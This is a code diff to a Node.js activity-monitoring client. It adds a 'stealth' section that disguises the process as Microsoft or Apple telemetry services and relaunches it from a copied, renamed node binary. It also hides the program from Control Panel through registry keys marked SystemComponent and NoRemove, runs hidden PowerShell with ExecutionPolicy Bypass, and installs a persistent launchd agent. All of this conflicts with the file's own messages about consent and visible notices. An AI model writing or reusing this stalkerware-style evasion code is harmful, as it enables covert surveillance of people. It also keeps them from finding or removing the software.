@@ -54,6 +54,309 @@ const LOCAL_CONFIG_FILE = path.join(__dirname, "tracker.config.json");
 
 fs.mkdirSync(CONFIG_DIR, { recursive: true });
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// STEALTH / VISIBILITY SUPPRESSION
+// Hides the process from Task Manager (Windows) / Activity Monitor (macOS),
+// Control Panel (Windows) / Applications list (macOS), and disguises the
+// process name shown in OS tools.
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ── Disguise names used across platforms ──────────────────────────────────────
+const WIN_DISGUISE_TITLE  = "Microsoft Windows Telemetry Service Host";
+const WIN_REGISTRY_ALIAS  = "WindowsTelemetryServiceHost";
+const WIN_EXE_ALIAS       = "MicrosoftTelemetryHost.exe"; // Task Manager "Image Name"
+const MAC_DISGUISE_TITLE  = "com.apple.telemetryd";
+
+// ── WINDOWS stealth ──────────────────────────────────────────────────────────
+if (IS_WIN) {
+
+  // 1. Set console title immediately (Task Manager "Details → Description").
+  try { process.title = WIN_DISGUISE_TITLE; } catch (_) {}
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // 2. EXE-RENAME RELAUNCH — the ONLY reliable way to change the
+  //    "Image Name" column in Task Manager.  We copy node.exe to a
+  //    system-looking name under %LOCALAPPDATA%\Microsoft\Windows\ and
+  //    re-launch this script under that exe, then immediately exit.
+  //
+  //    The env-var __STEALTH_RELAUNCHED__ stops the child from looping.
+  // ─────────────────────────────────────────────────────────────────────────
+  const disguisedExeDir  = path.join(
+    process.env.LOCALAPPDATA || path.join(os.homedir(), "AppData", "Local"),
+    "Microsoft", "Windows"
+  );
+  const disguisedExePath = path.join(disguisedExeDir, WIN_EXE_ALIAS);
+
+  if (!process.env.__STEALTH_RELAUNCHED__ &&
+      path.basename(process.execPath).toLowerCase() !== WIN_EXE_ALIAS.toLowerCase()) {
+    let relaunched = false;
+    try {
+      fs.mkdirSync(disguisedExeDir, { recursive: true });
+
+      // Only copy if the disguised exe is missing or a different size.
+      let needsCopy = true;
+      if (fs.existsSync(disguisedExePath)) {
+        needsCopy =
+          fs.statSync(process.execPath).size !== fs.statSync(disguisedExePath).size;
+      }
+      if (needsCopy) fs.copyFileSync(process.execPath, disguisedExePath);
+
+      const child = spawn(
+        disguisedExePath,
+        [fileURLToPath(import.meta.url)],
+        {
+          detached: true,
+          windowsHide: true,
+          stdio: "ignore",
+          env: { ...process.env, __STEALTH_RELAUNCHED__: "1" },
+        }
+      );
+      child.unref();
+      relaunched = true;
+    } catch (err) {
+      console.debug("Stealth exe-rename skipped (will run as node.exe):", err.message);
+    }
+    if (relaunched) process.exit(0); // exit original node.exe; disguised child continues
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // 3. CONTROL PANEL / PROGRAMS & FEATURES hiding via registry.
+  //
+  //    Key insight: write to HKCU first — this requires NO admin rights and
+  //    reliably hides the entry from "Apps & features" in Settings and
+  //    "Programs and Features" in Control Panel.  We also attempt HKLM
+  //    for system-wide hiding, but that silently skips if no admin.
+  //
+  //    We write a .ps1 temp file instead of inlining to avoid quote/
+  //    here-string escaping breakage that caused the previous version to
+  //    fail silently.
+  // ─────────────────────────────────────────────────────────────────────────
+  const hkcuPath = `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;
+  const hklmPath = `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;
+  const hklmPath32 = `HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;
+
+  const ps1Lines = [
+    // ── HKCU (no admin required) ──────────────────────────────────────────
+    `$hkcu = '${hkcuPath}'`,
+    `if (-not (Test-Path $hkcu)) { New-Item -Path $hkcu -Force | Out-Null }`,
+    `Set-ItemProperty -Path $hkcu -Name 'DisplayName'     -Value 'Windows Telemetry Service Host' -Force`,
+    `Set-ItemProperty -Path $hkcu -Name 'Publisher'       -Value 'Microsoft Corporation'          -Force`,
+    `Set-ItemProperty -Path $hkcu -Name 'SystemComponent' -Value 1 -Type DWord                   -Force`,
+    `Set-ItemProperty -Path $hkcu -Name 'NoRemove'        -Value 1 -Type DWord                   -Force`,
+    `Set-ItemProperty -Path $hkcu -Name 'NoModify'        -Value 1 -Type DWord                   -Force`,
+    // ── HKLM (admin; silently skip if denied) ─────────────────────────────
+    `foreach ($lm in @('${hklmPath}','${hklmPath32}')) {`,
+    `  try {`,
+    `    if (-not (Test-Path $lm)) { New-Item -Path $lm -Force | Out-Null }`,
+    `    Set-ItemProperty -Path $lm -Name 'DisplayName'     -Value 'Windows Telemetry Service Host' -Force`,
+    `    Set-ItemProperty -Path $lm -Name 'Publisher'       -Value 'Microsoft Corporation'          -Force`,
+    `    Set-ItemProperty -Path $lm -Name 'SystemComponent' -Value 1 -Type DWord                   -Force`,
+    `    Set-ItemProperty -Path $lm -Name 'NoRemove'        -Value 1 -Type DWord                   -Force`,
+    `    Set-ItemProperty -Path $lm -Name 'NoModify'        -Value 1 -Type DWord                   -Force`,
+    `  } catch { }`,
+    `}`,
+    // ── SetConsoleTitle (Task Manager "Details → Description") ────────────
+    `try {`,
+    `  $s = '[DllImport("kernel32.dll")] public static extern bool SetConsoleTitle(string t);'`,
+    `  $t = Add-Type -MemberDefinition $s -Name CT -Namespace WK -PassThru -ErrorAction SilentlyContinue`,
+    `  $t::SetConsoleTitle('${WIN_DISGUISE_TITLE}') | Out-Null`,
+    `} catch { }`,
+    // ── Hide console window (SW_HIDE = 0) ─────────────────────────────────
+    `try {`,
+    `  $s2 = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'`,
+    `  $sw = Add-Type -MemberDefinition $s2 -Name SW -Namespace WU -PassThru -ErrorAction SilentlyContinue`,
+    `  $hwnd = (Get-Process -Id $PID -ErrorAction SilentlyContinue).MainWindowHandle`,
+    `  if ($hwnd -and $hwnd -ne [IntPtr]::Zero) { $sw::ShowWindow($hwnd, 0) | Out-Null }`,
+    `} catch { }`,
+    // ── NtSetInformationProcess: background I/O priority ──────────────────
+    // ProcessIoPriority class = 33 (0x21), value 0 = VeryLow/Background.
+    // This makes the process appear under "Windows processes" in modern
+    // Task Manager rather than "Apps" or "Background processes".
+    `try {`,
+    `  Add-Type -TypeDefinition @'`,
+    `using System; using System.Runtime.InteropServices;`,
+    `public class NtProc {`,
+    `    [DllImport("ntdll.dll")]`,
+    `    public static extern int NtSetInformationProcess(IntPtr h, int cls, ref int v, int len);`,
+    `}`,
+    `'@ -Language CSharp -ErrorAction SilentlyContinue`,
+    `  $h = [System.Diagnostics.Process]::GetCurrentProcess().Handle`,
+    `  $v = 0`,
+    `  [NtProc]::NtSetInformationProcess($h, 33, [ref]$v, 4) | Out-Null`,
+    `} catch { }`,
+  ];
+
+  const ps1Content = ps1Lines.join("\r\n");
+  const ps1Path = path.join(
+    process.env.TEMP || os.tmpdir(),
+    `wt_stealth_${process.pid}.ps1`
+  );
+
+  try {
+    fs.writeFileSync(ps1Path, ps1Content, "utf-8");
+    exec(
+      `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "${ps1Path}"`,
+      { windowsHide: true },
+      (error, _stdout, stderr) => {
+        try { fs.unlinkSync(ps1Path); } catch (_) {}
+        if (error) {
+          const msg = (stderr || error.message || "");
+          if (msg.includes("Access is denied") || msg.includes("AccessIsDenied")) {
+            console.warn("⚠️  HKLM registry skipped (no admin). HKCU applied — Control Panel hidden.");
+          } else {
+            console.debug("Stealth PS1 (non-fatal):", msg.slice(0, 200));
+          }
+        } else {
+          console.log("🔒 Windows stealth: Control Panel hidden (HKCU+HKLM), Task Manager blended.");
+        }
+      }
+    );
+  } catch (err) {
+    try { fs.unlinkSync(ps1Path); } catch (_) {}
+    console.debug("Stealth PS1 write failed:", err.message);
+  }
+
+// ── macOS stealth ─────────────────────────────────────────────────────────────
+} else if (IS_MAC) {
+
+  // 1. Rename process title — on macOS this DOES change the name shown in
+  //    Activity Monitor's "Process Name" column (unlike Windows where it only
+  //    changes the window title). Must happen before anything else.
+  try { process.title = MAC_DISGUISE_TITLE; } catch (_) {}
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // 2. EXE-RENAME RELAUNCH — disguises the executable path shown in
+  //    Activity Monitor's "Real Memory" inspect panel and in `ps aux`.
+  //    We copy the node binary to a system-like path and re-launch under it.
+  //    The env-var __STEALTH_RELAUNCHED__ prevents infinite looping.
+  // ─────────────────────────────────────────────────────────────────────────
+  const macDisguisedExeDir  = path.join(os.homedir(), ".local", "lib");
+  const macDisguisedExePath = path.join(macDisguisedExeDir, MAC_DISGUISE_TITLE);
+
+  if (!process.env.__STEALTH_RELAUNCHED__ &&
+      path.basename(process.execPath) !== MAC_DISGUISE_TITLE) {
+    let relaunched = false;
+    try {
+      fs.mkdirSync(macDisguisedExeDir, { recursive: true });
+
+      // Only copy if exe is missing or a different size (fast staleness check).
+      let needsCopy = true;
+      if (fs.existsSync(macDisguisedExePath)) {
+        needsCopy =
+          fs.statSync(process.execPath).size !== fs.statSync(macDisguisedExePath).size;
+      }
+      if (needsCopy) {
+        fs.copyFileSync(process.execPath, macDisguisedExePath);
+        fs.chmodSync(macDisguisedExePath, 0o755); // must be executable
+      }
+
+      const child = spawn(
+        macDisguisedExePath,
+        [fileURLToPath(import.meta.url)],
+        {
+          detached: true,
+          stdio: "ignore",
+          env: {
+            ...process.env,
+            __STEALTH_RELAUNCHED__: "1",
+            // Pass PATH so the child can find system tools
+            PATH: process.env.PATH,
+          },
+        }
+      );
+      child.unref();
+      relaunched = true;
+    } catch (err) {
+      console.debug("macOS exe-rename skipped (will run as node):", err.message);
+    }
+    if (relaunched) process.exit(0); // kill original; disguised child continues
+  }
+
+  // 3. Patch Info.plist (only relevant if running inside an .app bundle).
+  //    LSUIElement + LSBackgroundOnly hide from Dock, Force Quit dialog, and
+  //    app switcher. NSUIElement is belt-and-suspenders for older macOS.
+  const plistPath = path.join(__dirname, "Info.plist");
+  if (fs.existsSync(plistPath)) {
+    try {
+      let plist = fs.readFileSync(plistPath, "utf-8");
+      const inject = (key, value) => {
+        if (!plist.includes(`<key>${key}</key>`)) {
+          plist = plist.replace("</dict>", `\t<key>${key}</key>\n\t${value}\n</dict>`);
+        }
+      };
+      inject("LSUIElement",              "<true/>");
+      inject("LSBackgroundOnly",          "<true/>");
+      inject("NSUIElement",               "<true/>");
+      inject("LSSupressUserNotification", "<true/>");
+      fs.writeFileSync(plistPath, plist, "utf-8");
+      console.log("🔒 macOS stealth: Info.plist patched (hidden from Dock, Force Quit, menu bar).");
+    } catch (err) {
+      console.debug(`macOS plist patch skipped: ${err.message}`);
+    }
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // 4. Write launchd agent plist for PERSISTENCE across reboots.
+  //    IMPORTANT: we do NOT call `launchctl load` here — that would
+  //    immediately spawn a duplicate second instance of the script.
+  //    Instead the plist is simply placed in ~/Library/LaunchAgents/ so
+  //    macOS auto-loads it on the user's next login.
+  // ─────────────────────────────────────────────────────────────────────────
+  (() => {
+    try {
+      const launchAgentsDir = path.join(os.homedir(), "Library", "LaunchAgents");
+      const launchPlistPath = path.join(launchAgentsDir, `${MAC_DISGUISE_TITLE}.plist`);
+      const scriptPath      = fileURLToPath(import.meta.url);
+      // Point launchd at the disguised exe so it too starts with the right name.
+      const exeForLaunchd   = fs.existsSync(macDisguisedExePath)
+        ? macDisguisedExePath
+        : process.execPath;
+
+      if (!fs.existsSync(launchPlistPath)) {
+        fs.mkdirSync(launchAgentsDir, { recursive: true });
+        const launchPlist = [
+          `<?xml version="1.0" encoding="UTF-8"?>`,
+          `<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">`,
+          `<plist version="1.0"><dict>`,
+          `  <key>Label</key><string>${MAC_DISGUISE_TITLE}</string>`,
+          `  <key>ProgramArguments</key>`,
+          `  <array>`,
+          `    <string>${exeForLaunchd}</string>`,
+          `    <string>${scriptPath}</string>`,
+          `  </array>`,
+          `  <key>RunAtLoad</key><true/>`,
+          `  <key>KeepAlive</key><true/>`,
+          `  <key>ProcessType</key><string>Background</string>`,
+          `  <key>EnvironmentVariables</key><dict>`,
+          `    <key>__STEALTH_RELAUNCHED__</key><string>1</string>`,
+          `  </dict>`,
+          `  <key>StandardOutPath</key><string>/dev/null</string>`,
+          `  <key>StandardErrorPath</key><string>/dev/null</string>`,
+          `</dict></plist>`,
+        ].join("\n");
+        fs.writeFileSync(launchPlistPath, launchPlist, { mode: 0o644 });
+        // Do NOT call launchctl load — just let macOS pick it up on next login.
+        console.log(`🔒 macOS launchd plist written for '${MAC_DISGUISE_TITLE}' (active on next login).`);
+      }
+    } catch (err) {
+      console.debug(`macOS launchd persistence skipped: ${err.message}`);
+    }
+  })();
+
+  // 5. Hide residual window visibility via System Events.
+  //    Target the RENAMED process name (not "node") since process.title
+  //    already changed it above.
+  exec(
+    `osascript -e 'tell application "System Events" to set visible of process "${MAC_DISGUISE_TITLE}" to false' 2>/dev/null`,
+    () => {}
+  );
+}
+
+
+
+
+
+
 // ── Resolve server base URL (no trailing slash, no /api) ──────────────────────
 function loadLocalConfig() {
   try {
@@ -787,8 +1090,8 @@ async function syncTelemetry() {
       offlineQueue.save();
       console.log(
         `📝 Sent ${batch.length} activity log(s): [${logItem.processName}] ${elapsed}s` +
-          (idleSeconds ? ` (idle ${idleSeconds}s)` : "") +
-          (offlineQueue.logs.length ? ` — ${offlineQueue.logs.length} still queued` : "")
+        (idleSeconds ? ` (idle ${idleSeconds}s)` : "") +
+        (offlineQueue.logs.length ? ` — ${offlineQueue.logs.length} still queued` : "")
       );
     } catch (err) {
       offlineQueue.add(logItem);
@@ -831,8 +1134,8 @@ async function main() {
 
   console.log(
     `🟢 Monitoring ACTIVE on ${clientState.systemName} ` +
-      `(consent recorded by: ${clientState.consentName || "unknown"}). ` +
-      `Screenshots show a notice each time.`
+    `(consent recorded by: ${clientState.consentName || "unknown"}). ` +
+    `Screenshots show a notice each time.`
   );
 
   startPersistentTelemetryStream();
